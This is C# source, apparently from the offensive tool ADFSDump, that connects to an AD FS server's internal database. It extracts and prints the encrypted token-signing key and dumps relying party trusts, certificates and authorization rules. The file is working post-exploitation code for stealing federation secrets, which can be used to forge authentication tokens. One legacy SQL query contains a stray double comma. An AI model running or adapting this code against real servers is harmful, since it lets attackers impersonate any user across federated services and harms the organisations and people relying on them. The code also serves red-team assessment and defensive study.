using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Linq;
using System.Xml;
using ADFSDump.RelyingPartyTrust;

namespace ADFSDump.ReadDB
{
    public static class DatabaseReader
    {
        private const string WidConnectionString = "Data Source=np:\\\\.\\pipe\\microsoft##wid\\tsql\\query;Integrated Security=True";
        private const string WidConnectionStringLegacy = "Data Source=np:\\\\.\\pipe\\MSSQL$MICROSOFT##SSEE\\sql\\query";
        private const string ReadEncryptedPfxQuery = "SELECT ServiceSettingsData from {0}.IdentityServerPolicy.ServiceSettings";
        private static readonly string[] BuiltInScopes = { "SelfScope", "ProxyTrustProvisionRelyingParty", "Device Registration Service", "UserInfo", "PRTUpdateRp", "Windows Hello - Certificate Provisioning Service", "urn:AppProxy:com" };
        private const string ReadScopePolicies = "SELECT SCOPES.ScopeId,SCOPES.Name,SCOPES.WSFederationPassiveEndpoint,SCOPES.Enabled,SCOPES.SignatureAlgorithm,SCOPES.EntityId,SCOPES.EncryptionCertificate,SCOPES.MustEncryptNameId, SCOPES.SamlResponseSignatureType, SCOPES.ParameterInterface, SAML.Binding, SAML.Location,POLICYTEMPLATE.name, POLICYTEMPLATE.PolicyMetadata, POLICYTEMPLATE.InterfaceVersion, SCOPEIDS.IdentityData FROM {0}.IdentityServerPolicy.Scopes SCOPES LEFT OUTER JOIN {0}.IdentityServerPolicy.ScopeAssertionConsumerServices SAML ON SCOPES.ScopeId = SAML.ScopeId LEFT OUTER JOIN {0}.IdentityServerPolicy.PolicyTemplates POLICYTEMPLATE ON SCOPES.PolicyTemplateId = POLICYTEMPLATE.PolicyTemplateId LEFT OUTER JOIN {0}.IdentityServerPolicy.ScopeIdentities SCOPEIDS ON SCOPES.ScopeId = SCOPEIDS.ScopeId";
        private const string ReadScopePoliciesLegacy = "SELECT SCOPES.ScopeId,SCOPES.Name,SCOPES.WSFederationPassiveEndpoint,SCOPES.Enabled,SCOPES.SignatureAlgorithm,SCOPES.EntityId,SCOPES.EncryptionCertificate,SCOPES.MustEncryptNameId, ,SCOPES.SamlResponseSignatureType, SAML.Binding, SAML.Location, SCOPEIDS.IdentityData FROM {0}.IdentityServerPolicy.Scopes SCOPES LEFT OUTER JOIN {0}.IdentityServerPolicy.ScopeAssertionConsumerServices SAML ON SCOPES.ScopeId = SAML.ScopeId LEFT OUTER JOIN {0}.IdentityServerPolicy.ScopeIdentities SCOPEIDS ON SCOPES.ScopeId = SCOPEIDS.ScopeId";
        private const string ReadRules = "Select SCOPE.ScopeId, SCOPE.name, POLICIES.PolicyData,POLICIES.PolicyType, POLICIES.PolicyUsage FROM {0}.IdentityServerPolicy.Scopes SCOPE INNER JOIN {0}.IdentityServerPolicy.ScopePolicies SCOPEPOLICIES ON SCOPE.ScopeId = SCOPEPOLICIES.ScopeId INNER JOIN {0}.IdentityServerPolicy.Policies POLICIES ON SCOPEPOLICIES.PolicyId = POLICIES.PolicyId";
        private const string ReadDatabases = "SELECT name FROM sys.databases";
        private const string AdfsConfigTable = "AdfsConfiguration";
        private const string Adfs2012R2 = "AdfsConfiguration";
        private const string Adfs2016 = "AdfsConfigurationV3";
        private const string Adfs2019 = "AdfsConfigurationV4";
        

        public static Dictionary<string, RelyingParty>.ValueCollection ReadConfigurationDb()
        {
            SqlConnection conn = null;
            string connectionString = "";
            var os = Environment.OSVersion;
            if ((os.Version.Major == 6 && os.Version.Minor <= 1) || os.Version.Major < 6)
            {
                // we are on 2008 R2 or below which means legacy
                connectionString = WidConnectionStringLegacy;
            }
            else
            {
                connectionString = WidConnectionString;
            }
            try
            {
                conn = new SqlConnection(connectionString);
                conn.Open();
            }  catch (Exception e)
            {
                Console.WriteLine($"!!! Error connecting to WID.\n {e}");
                Environment.Exit(1);
            }
            
            string adfsVersion = GetAdfsVersion(conn);
            if (string.IsNullOrEmpty(adfsVersion))
            {
                Console.WriteLine("!! Error identifying AD FS version");
                return null;
            }
            else
            {
                return ReadWid(adfsVersion, conn);
            }
            
        }

        private static string GetAdfsVersion(SqlConnection conn)
        {
            SqlDataReader reader = null;
            try
            {
                SqlCommand cmd = new SqlCommand(ReadDatabases, conn);
                reader = cmd.ExecuteReader();
            } catch (Exception e)
            {
                Console.WriteLine($"!! Exception connecting to WID: {e}");
            }
            while (reader.Read())
            {
                string dbName = (string)reader["name"];
                if (dbName.Contains(AdfsConfigTable))
                {
                    reader.Close();
                    return dbName;
                }
            }
            return null;

        }

        private static Dictionary<string, RelyingParty>.ValueCollection ReadWid(string dbName, SqlConnection conn)
        {
            Dictionary<string, RelyingParty> rps = new Dictionary<string, RelyingParty>();

            SqlDataReader reader = null;
           
            try
            {
                string readEncryptedPfxQuery = string.Format(ReadEncryptedPfxQuery, dbName);
                SqlCommand cmd = new SqlCommand(readEncryptedPfxQuery, conn);
                reader = cmd.ExecuteReader();

            } catch (Exception e)
            {
                Console.WriteLine("!!! Exception: {0}", e);
            }

            Console.WriteLine("## Reading Encrypted Signing Key from Database");
            while (reader.Read())
            {
                string xmlString = (string)reader["ServiceSettingsData"];

                XmlDocument xmlDocument = new XmlDocument();
                xmlDocument.LoadXml(xmlString);

                XmlElement root = xmlDocument.DocumentElement;

                XmlElement signingToken = root.GetElementsByTagName("SigningToken")[0] as XmlElement;
                if (signingToken != null)
                {
                    XmlNode encryptedPfx = signingToken.GetElementsByTagName("EncryptedPfx")[0];
                    Console.WriteLine("[-] Encrypted Token Signing Key Begin\r\n{0}\r\n[-] Encrypted Token Signing Key End\r\n", encryptedPfx.InnerText);
                }
            }
            reader.Close();

            // enumerate scopes and policies
            try
            {
                string readScopePolicies = "";
                switch (dbName)
                {
                    case Adfs2012R2:
                        Console.WriteLine("[-] Detected AD FS 2012");
                        readScopePolicies = string.Format(ReadScopePoliciesLegacy, dbName);
                        break;
                    case Adfs2016:
                        Console.WriteLine("[-] Detected AD FS 2016");
                        readScopePolicies = string.Format(ReadScopePolicies, dbName);
                        break;
                    case Adfs2019:
                        Console.WriteLine("[-] Detected AD FS 2019");
                        readScopePolicies = string.Format(ReadScopePolicies, dbName);
                        break;
                    default:
                        Console.WriteLine("!!! Couldn't determine AD FS version. Quitting");
                        break;
                }
                
                SqlCommand cmd = new SqlCommand(readScopePolicies, conn);
                reader = cmd.ExecuteReader();
            }
            catch (Exception e)
            {
                Console.WriteLine("!!! Exception: {0}", e);
                Environment.Exit(1);
            }

            Console.WriteLine("## Reading Relying Party Trust Information from Database");
            while (reader.Read())
            {
 
                string name = (string)reader["Name"];
                if (!BuiltInScopes.Any(name.Contains))
                {

                    string scopeId = reader["ScopeId"].ToString();
                    RelyingParty rp = new RelyingParty { Name = name, Id = scopeId };
                    rp.IsEnabled = (bool)reader["Enabled"];
                    rp.SignatureAlgorithm = (string)reader["SignatureAlgorithm"];
                    if (dbName != Adfs2012R2)
                    {
                        rp.AccessPolicy = (string)reader["PolicyMetadata"];
                        if (!reader.IsDBNull(9))
                        {
                            rp.AccessPolicyParam = (string)reader["ParameterInterface"];
                        }
 
                    }
                    
                    rp.Identity = (string)reader["IdentityData"];

                    if (!reader.IsDBNull(2))
                    {
                        rp.IsSaml = false;
                        rp.IsWsFed = true;
                        rp.FederationEndpoint = (string)reader["WSFederationPassiveEndpoint"];
                    }
                    else
                    {
                        rp.IsSaml = true;
                        rp.IsWsFed = false;
                        rp.FederationEndpoint = (string)reader["Location"];
                    }

                    if (!reader.IsDBNull(6))
                    {
                        rp.EncryptionCert = (string)reader["EncryptionCertificate"];
                    }

                    rp.SamlResponseSignatureType = (int) reader["SamlResponseSignatureType"];
                    rps[scopeId] = rp;
                    
                }
            }
            reader.Close();

            try
            {
                string readRules = string.Format(ReadRules, dbName);
                SqlCommand cmd = new SqlCommand(readRules, conn);
                reader = cmd.ExecuteReader();
            }
            catch( Exception e)
            {
                Console.WriteLine("!!! Exception: {0}", e);
                Environment.Exit(1);
            }

            while (reader.Read())
            {

                string scopeId = reader["ScopeId"].ToString();
                string rule = (string)reader["PolicyData"];
                if (rps.Keys.Contains(scopeId) && !string.IsNullOrEmpty(rule))
                {

                    PolicyType ruleType = (PolicyType)reader["PolicyUsage"];
                    switch (ruleType)
                    {
                        case PolicyType.StrongAuthAuthorizationRules:
                            rps[scopeId].StrongAuthRules = rule;
                            break;
                        case PolicyType.OnBehalfAuthorizationRules:
                            rps[scopeId].OnBehalfAuthRules = rule;
                            break;
                        case PolicyType.ActAsAuthorizationRules:
                            rps[scopeId].AuthRules = rule;
                            break;
                        case PolicyType.IssuanceRules:
                            rps[scopeId].IssuanceRules = rule;
                            break;
                    }  

                }


            }
            reader.Close();
            conn.Close();
            return rps.Values;
        }

    }
}
